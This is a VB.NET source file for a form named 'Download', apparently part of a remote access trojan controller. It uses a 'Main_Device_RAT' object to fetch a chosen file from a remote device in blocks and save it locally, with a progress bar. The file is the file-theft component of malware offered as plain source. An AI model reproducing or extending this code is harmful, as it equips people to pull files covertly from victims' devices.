Public Class Download
    Public Rat As New Main_Device_RAT
    Public File As String = ""
    Public Path As String = ""
    Public Downloaded As Long
    Public FileSize As Long
    Public Stream As IO.Stream
    Private Sub Download_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            File = File_Manager.TextBox2.Text
            Dim Txt() As String
            If File.Contains("\") Then
                Txt = File.Split("\")
            Else
                Txt = File.Split("/")
            End If
            FolderBrowserDialog1.ShowDialog()
            Path = FolderBrowserDialog1.SelectedPath & "\" & Txt(Txt.Length - 1)
            Form1.Connect()
            FileSize = Rat.GetFileSize(File)
            Dim Stream As New IO.FileStream(Path, IO.FileMode.OpenOrCreate)
            Stream.Position = Stream.Length
            Downloaded = Stream.Length
            TextBox1.Text = File
            TextBox2.Text = Path
            Lblrecieved.Text = Downloaded & "Bytes"
            Lblsize.Text = FileSize & "Bytes"
            Me.Stream = Stream
            Timer1.Interval = 1
            Timer1.Start()
            Timer2.Interval = 1
            Timer2.Start()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        If CheckBox1.Checked = True Then
            Try
                Form1.Connect()
                Dim BlockSize As Integer = Me.NumericUpDown1.Value
                If Downloaded + BlockSize > FileSize Then
                    Dim Bytes = Rat.DownloadFilePart(File, Downloaded, FileSize - Downloaded)
                    Stream.Write(Bytes, 0, Bytes.Length)
                    Stream.Flush()
                    Downloaded = Downloaded + Bytes.Length
                Else
                    Dim Bytes = Rat.DownloadFilePart(File, Downloaded, BlockSize)
                    Stream.Write(Bytes, 0, Bytes.Length)
                    Downloaded = Downloaded + Bytes.Length
                End If
                If FileSize <= Downloaded Then CheckBox1.Checked = False
            Catch ex As Exception
                MsgBox(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick

        If FileSize <= Downloaded Then
            ProgressBar1.Value = 100
            Lblrecieved.Text = Downloaded.ToString + " Bytes"
        ElseIf FileSize > Downloaded Then
            Dim Divide As Decimal = (Downloaded / FileSize)
            Dim Value As Decimal = Divide * 100
            ProgressBar1.Value = Value
            Lblrecieved.Text = Downloaded.ToString + " Bytes"
        End If
    End Sub
End Class